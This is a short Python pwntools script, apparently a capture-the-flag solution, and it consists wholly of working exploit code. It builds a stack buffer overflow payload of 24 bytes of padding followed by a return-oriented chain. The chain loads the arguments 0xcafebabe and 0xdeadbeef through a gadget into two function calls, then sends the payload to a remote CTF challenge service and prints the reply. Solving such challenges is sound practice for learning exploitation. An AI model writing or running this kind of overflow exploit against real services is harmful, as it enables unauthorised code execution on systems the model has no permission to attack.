from pwn import *

payload = 'A'*24+p64(0x000000000040134b)+p64(0xcafebabe)+p64(0x401182)+p64(0x000000000040134b)+p64(0xdeadbeef)+p64(0x401204)

p = remote('hack.bckdr.in',10169)
print p.recvuntil('??\n')
p.sendline(payload)
print p.recvall()
